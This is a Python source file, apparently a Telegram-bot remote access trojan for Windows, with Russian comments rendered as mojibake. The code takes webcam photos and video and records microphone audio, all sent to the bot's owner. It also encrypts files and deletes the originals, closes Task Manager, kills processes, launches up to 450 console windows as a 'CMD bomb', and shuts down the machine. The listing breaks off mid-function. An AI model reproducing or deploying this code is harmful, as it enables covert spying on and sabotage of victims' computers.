import os
import sys
import time
import random
import subprocess
import threading
import ctypes
import psutil
import shutil
import win32api
import win32con
import win32gui
import pyautogui
import cv2
import sounddevice as sd
import numpy as np
import telebot
from telebot import types
from cryptography.fernet import Fernet
from PIL import Image

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
AUTHORIZED_USER_ID = 123456789  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à Telegram ID
WEB_CAMERA_INDEX = 0  # –ò–Ω–¥–µ–∫—Å –≤–µ–±-–∫–∞–º–µ—Ä—ã (–æ–±—ã—á–Ω–æ 0)
SCREENSHOT_PATH = 'screenshot.jpg'
AUDIO_RECORD_PATH = 'audio_record.wav'
VIDEO_RECORD_PATH = 'video_record.avi'
ENCRYPTED_FILE_SUFFIX = '.encrypted'
KEY_FILE = 'encryption_key.key'

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞
bot = telebot.TeleBot(TOKEN)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —Å–æ—Å—Ç–æ—è–Ω–∏–π
current_directory = os.path.expanduser('~')
waiting_for_shutdown_confirmation = False
shutdown_confirmation_code = None
waiting_for_file_path = False
waiting_for_audio_duration = False
waiting_for_video_duration = False
waiting_for_process_pid = False
waiting_for_cursor_madness_duration = False
waiting_for_cmd_bomb_count = False
waiting_for_wallpaper_image = False
waiting_for_encrypt_path = False
waiting_for_decrypt_path = False
waiting_for_upload_path = False

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
def is_authorized(user_id):
    return user_id == AUTHORIZED_USER_ID

# –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as key_file:
            key_file.write(key)

# –ó–∞–≥—Ä—É–∑–∫–∞ –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
def load_key():
    if not os.path.exists(KEY_FILE):
        generate_key()
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

# –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞
def encrypt_file(file_path):
    try:
        key = load_key()
        fernet = Fernet(key)
        
        with open(file_path, 'rb') as file:
            original = file.read()
        
        encrypted = fernet.encrypt(original)
        
        encrypted_path = file_path + ENCRYPTED_FILE_SUFFIX
        with open(encrypted_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
        
        os.remove(file_path)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏: {e}")
        return False

# –î–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞
def decrypt_file(encrypted_path):
    try:
        if not encrypted_path.endswith(ENCRYPTED_FILE_SUFFIX):
            return False
        
        key = load_key()
        fernet = Fernet(key)
        
        with open(encrypted_path, 'rb') as enc_file:
            encrypted = enc_file.read()
        
        decrypted = fernet.decrypt(encrypted)
        
        original_path = encrypted_path[:-len(ENCRYPTED_FILE_SUFFIX)]
        with open(original_path, 'wb') as dec_file:
            dec_file.write(decrypted)
        
        os.remove(encrypted_path)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–∏: {e}")
        return False

# –°–æ–∑–¥–∞–Ω–∏–µ –≥–ª–∞–≤–Ω–æ–≥–æ –º–µ–Ω—é
def create_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn1 = types.KeyboardButton('üì∑ –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã')
    btn2 = types.KeyboardButton('üé• –ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã')
    btn3 = types.KeyboardButton('üé§ –ó–∞–ø–∏—Å–∞—Ç—å –∑–≤—É–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞')
    btn4 = types.KeyboardButton('‚ùå –ó–∞–∫—Ä—ã—Ç—å —Ç–µ–∫—É—â–µ–µ –æ–∫–Ω–æ')
    btn5 = types.KeyboardButton('‚ùå‚ùå –ó–∞–∫—Ä—ã—Ç—å –≤—Å–µ –æ–∫–Ω–∞')
    btn6 = types.KeyboardButton('üñºÔ∏è –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏')
    btn7 = types.KeyboardButton('üìÇ –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç–µ–∫—É—â—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é')
    btn8 = types.KeyboardButton('üìÇ –ü–µ—Ä–µ–π—Ç–∏ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é')
    btn9 = types.KeyboardButton('üìÑ –û—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª')
    btn10 = types.KeyboardButton('üì§ –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª')
    btn11 = types.KeyboardButton('üîí –ó–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª')
    btn12 = types.KeyboardButton('üîì –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª')   
    btn13 = types.KeyboardButton('‚èª –í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä')
    btn14 = types.KeyboardButton('üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä')
    btn15 = types.KeyboardButton('‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö')
    btn16 = types.KeyboardButton('üìä –ó–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã')
    btn17 = types.KeyboardButton('üíÄ –ü—Ä–µ–∫—Ä–∞—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å')
    btn18 = types.KeyboardButton('‚ùå –ó–∞–∫—Ä—ã—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á')
    btn19 = types.KeyboardButton('üåÄ –°–≤–µ—Å—Ç–∏ –∫—É—Ä—Å–æ—Ä —Å —É–º–∞')
    btn20 = types.KeyboardButton('üí£ CMD –±–æ–º–±–∞')
    btn21 = types.KeyboardButton('üìÄ –û—Ç–∫—Ä—ã—Ç—å –¥–∏—Å–∫–æ–≤–æ–¥')
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, 
              btn11, btn12, btn13, btn14, btn15, btn16, btn17, btn18, btn19, 
              btn20, btn21)
    
    return markup

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã
def record_video(duration):
    cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
    if not cap.isOpened():
        return False
    
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(VIDEO_RECORD_PATH, fourcc, 20.0, (640, 480))
    
    start_time = time.time()
    while (time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    
    cap.release()
    out.release()
    return True

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –∑–≤—É–∫–∞ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
def record_audio(duration):
    fs = 44100  # –ß–∞—Å—Ç–æ—Ç–∞ –¥–∏—Å–∫—Ä–µ—Ç–∏–∑–∞—Ü–∏–∏
    seconds = duration
    
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # –ñ–¥–µ–º –æ–∫–æ–Ω—á–∞–Ω–∏—è –∑–∞–ø–∏—Å–∏
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª
    from scipy.io.wavfile import write
    write(AUDIO_RECORD_PATH, fs, recording)
    return True

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –≤—Å–µ—Ö –æ–∫–æ–Ω
def close_all_windows():
    try:
        # –ü–æ–ª—É—á–∞–µ–º –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞
        desktop = win32gui.GetDesktopWindow()
        
        # –ü–µ—Ä–µ—á–∏—Å–ª—è–µ–º –≤—Å–µ –¥–æ—á–µ—Ä–Ω–∏–µ –æ–∫–Ω–∞ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞
        def enum_windows_callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd) and hwnd != desktop:
                windows.append(hwnd)
        
        windows = []
        win32gui.EnumWindows(enum_windows_callback, windows)
        
        # –ó–∞–∫—Ä—ã–≤–∞–µ–º –≤—Å–µ –æ–∫–Ω–∞
        for hwnd in windows:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ –æ–∫–æ–Ω: {e}")
        return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–º–µ–Ω—ã –æ–±–æ–µ–≤
def change_wallpaper(image_path):
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Ñ–∞–π–ª —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
        if not os.path.exists(image_path):
            return False
        
        # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ BMP, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ (–¥–ª—è —Å—Ç–∞—Ä—ã—Ö –≤–µ—Ä—Å–∏–π Windows)
        if not image_path.lower().endswith('.bmp'):
            img = Image.open(image_path)
            bmp_path = os.path.splitext(image_path)[0] + '.bmp'
            img.save(bmp_path, 'BMP')
            image_path = bmp_path
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –æ–±–æ–∏
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–º–µ–Ω–µ –æ–±–æ–µ–≤: {e}")
        return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ
def get_system_info():
    try:
        info = []
        
        # –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä
        cpu_info = f"–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {os.cpu_count()} —è–¥–µ—Ä, {psutil.cpu_percent()}% –∑–∞–≥—Ä—É–∑–∫–∏"
        info.append(cpu_info)
        
        # –ü–∞–º—è—Ç—å
        mem = psutil.virtual_memory()
        mem_info = f"–ü–∞–º—è—Ç—å: {mem.used / (1024**3):.2f} GB / {mem.total / (1024**3):.2f} GB ({mem.percent}%)"
        info.append(mem_info)
        
        # –î–∏—Å–∫–∏
        disks = []
        for part in psutil.disk_partitions(all=False):
            usage = psutil.disk_usage(part.mountpoint)
            disk_info = f"–î–∏—Å–∫ {part.device}: {usage.used / (1024**3):.2f} GB / {usage.total / (1024**3):.2f} GB ({usage.percent}%)"
            disks.append(disk_info)
        info.extend(disks)
        
        # –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        net_info = []
        for name, stats in psutil.net_if_stats().items():
            if stats.isup:
net_info.append(f"–°–µ—Ç—å: {name} (—Å–∫–æ—Ä–æ—Å—Ç—å: {stats.speed} Mbps)")
        info.extend(net_info)
        
        # –ë–∞—Ç–∞—Ä–µ—è (–µ—Å–ª–∏ –µ—Å—Ç—å)
        try:
            battery = psutil.sensors_battery()
            if battery:
                battery_info = f"–ë–∞—Ç–∞—Ä–µ—è: {battery.percent}% ({'–ø–æ–¥–∫–ª—é—á–µ–Ω–æ' if battery.power_plugged else '–Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ'})"
                info.append(battery_info)
        except:
            pass
        
        return "\n".join(info)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ: {e}")
        return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
def get_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append(f"PID: {proc.info['pid']}, {proc.info['name']}")
        return "\n".join(processes[:50])  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≤—ã–≤–æ–¥ –ø–µ—Ä–≤—ã–º–∏ 50 –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤: {e}")
        return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –ø–æ PID
def kill_process(pid):
    try:
        pid = int(pid)
        process = psutil.Process(pid)
        process.terminate()
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")
        return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á
def close_task_manager():
    try:
        # –ü–æ–ª—É—á–∞–µ–º –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–∫–Ω–∞ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á
        hwnd = win32gui.FindWindow(None, "–î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á")
        if hwnd:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            return True
        return False
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á: {e}")
        return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è "—Å–≤–µ–¥–µ–Ω–∏—è –∫—É—Ä—Å–æ—Ä–∞ —Å —É–º–∞"
def cursor_madness(duration):
    try:
        start_time = time.time()
        while (time.time() - start_time) < duration:
            x, y = pyautogui.position()
            new_x = x + random.randint(-50, 50)
            new_y = y + random.randint(-50, 50)
            pyautogui.moveTo(new_x, new_y, duration=0.1)
            time.sleep(0.05)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ cursor_madness: {e}")
        return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è "CMD –±–æ–º–±—ã"
def cmd_bomb(count):
    try:
        count = min(int(count), 450)  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
        for _ in range(count):
            subprocess.Popen('cmd', creationflags=subprocess.CREATE_NEW_CONSOLE)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ cmd_bomb: {e}")
        return False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –¥–∏—Å–∫–æ–≤–æ–¥–∞
def open_cd_drive():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –¥–∏—Å–∫–æ–≤–æ–¥–∞: {e}")
        return False

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω!")
        return
    
    bot.send_message(message.chat.id, "–ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ, —Å–µ—Ä!", reply_markup=create_main_menu())

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω!")
        return
    
    global waiting_for_shutdown_confirmation, shutdown_confirmation_code
    global waiting_for_file_path, waiting_for_audio_duration, waiting_for_video_duration
    global waiting_for_process_pid, waiting_for_cursor_madness_duration
    global waiting_for_cmd_bomb_count, waiting_for_wallpaper_image
    global waiting_for_encrypt_path, waiting_for_decrypt_path, waiting_for_upload_path
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è
    if waiting_for_shutdown_confirmation:
        if message.text == str(shutdown_confirmation_code):
            bot.send_message(message.chat.id, "–í—ã–∫–ª—é—á–∞—é –∫–æ–º–ø—å—é—Ç–µ—Ä...")
            os.system("shutdown /s /t 1")
            waiting_for_shutdown_confirmation = False
        else:
            bot.send_message(message.chat.id, "–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è. –û—Ç–º–µ–Ω–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è.", reply_markup=create_main_menu())
            waiting_for_shutdown_confirmation = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—É—Ç–∏ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞
    if waiting_for_upload_path:
        try:
            path = message.text.strip()
            if not os.path.isdir(path):
                bot.send_message(message.chat.id, "–£–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–µ–π. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
                return
            
            waiting_for_upload_path = False
            bot.send_message(message.chat.id, f"–¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –≤ {path}")
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_upload_path = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—É—Ç–∏ –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞
    if waiting_for_encrypt_path:
        try:
            path = message.text.strip()
            if not os.path.isfile(path):
                bot.send_message(message.chat.id, "–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
                return
            
            if encrypt_file(path):
                bot.send_message(message.chat.id, "–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª.", reply_markup=create_main_menu())
            
            waiting_for_encrypt_path = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_encrypt_path = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—É—Ç–∏ –¥–ª—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞
    if waiting_for_decrypt_path:
        try:
            path = message.text.strip()
            if not os.path.isfile(path):
                bot.send_message(message.chat.id, "–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
                return
            
            if decrypt_file(path):
                bot.send_message(message.chat.id, "–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª.", reply_markup=create_main_menu())
            
            waiting_for_decrypt_path = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_decrypt_path = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ PID –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è
    if waiting_for_process_pid:
        try:
            pid = message.text.strip()
            if kill_process(pid):
                bot.send_message(message.chat.id, "–ü—Ä–æ—Ü–µ—Å—Å —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å.", reply_markup=create_main_menu())
            
            waiting_for_process_pid = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_process_pid = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –¥–ª—è "—Å–≤–µ–¥–µ–Ω–∏—è –∫—É—Ä—Å–æ—Ä–∞ —Å —É–º–∞"
    if waiting_for_cursor_madness_duration:
        try:
            duration = int(message.text.strip())
            if duration <= 0 or duration > 60:
                bot.send_message(message.chat.id, "–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 1 –¥–æ 60 —Å–µ–∫—É–Ω–¥.")
                return
            
            bot.send_message(message.chat.id, f"–ö—É—Ä—Å–æ—Ä –±—É–¥–µ—Ç '—Å—Ö–æ–¥–∏—Ç—å —Å —É–º–∞' –≤ —Ç–µ—á–µ–Ω–∏–µ {duration} —Å–µ–∫—É–Ω–¥...")
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ, —á—Ç–æ–±—ã –Ω–µ –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –±–æ—Ç–∞
            threading.Thread(target=cursor_madness, args=(duration,)).start()
            
            waiting_for_cursor_madness_duration = False
            bot.send_message(message.chat.id, "–ì–æ—Ç–æ–≤–æ!", reply_markup=create_main_menu())
        except ValueError:
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
            waiting_for_cursor_madness_duration = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_cursor_madness_duration = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –¥–ª—è "CMD –±–æ–º–±—ã"
    if waiting_for_cmd_bomb_count:
        try:
            count = int(message.text.strip())
            if count <= 0 or count > 450:
                bot.send_message(message.chat.id, "–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ—Ç 1 –¥–æ 450.")
                return
            
            if cmd_bomb(count):
                bot.send_message(message.chat.id, f"–ó–∞–ø—É—â–µ–Ω–æ {count} –æ–∫–æ–Ω CMD!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å CMD –±–æ–º–±—É.", reply_markup=create_main_menu())
            
            waiting_for_cmd_bomb_count = False
        except ValueError:
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
            waiting_for_cmd_bomb_count = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_cmd_bomb_count = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –∑–∞–ø–∏—Å–∏ –∑–≤—É–∫–∞
    if waiting_for_audio_duration:
        try:
            duration = int(message.text.strip())
            if duration <= 0 or duration > 60:
                bot.send_message(message.chat.id, "–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 1 –¥–æ 60 —Å–µ–∫—É–Ω–¥.")
                return
            
            bot.send_message(message.chat.id, f"–ó–∞–ø–∏—Å—ã–≤–∞—é –∑–≤—É–∫ –≤ —Ç–µ—á–µ–Ω–∏–µ {duration} —Å–µ–∫—É–Ω–¥...")
            
            if record_audio(duration):
                with open(AUDIO_RECORD_PATH, 'rb') as audio_file:
                    bot.send_audio(message.chat.id, audio_file)
                os.remove(AUDIO_RECORD_PATH)
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –∑–≤—É–∫.")
            
            waiting_for_audio_duration = False
            bot.send_message(message.chat.id, "–ì–æ—Ç–æ–≤–æ!", reply_markup=create_main_menu())
        except ValueError:
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
            waiting_for_audio_duration = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_audio_duration = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ
    if waiting_for_video_duration:
        try:
            duration = int(message.text.strip())
            if duration <= 0 or duration > 30:
                bot.send_message(message.chat.id, "–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 1 –¥–æ 30 —Å–µ–∫—É–Ω–¥.")
                return
            
            bot.send_message(message.chat.id, f"–ó–∞–ø–∏—Å—ã–≤–∞—é –≤–∏–¥–µ–æ –≤ —Ç–µ—á–µ–Ω–∏–µ {duration} —Å–µ–∫—É–Ω–¥...")
            
            if record_video(duration):
                with open(VIDEO_RECORD_PATH, 'rb') as video_file:
                    bot.send_video(message.chat.id, video_file)
                os.remove(VIDEO_RECORD_PATH)
            else:
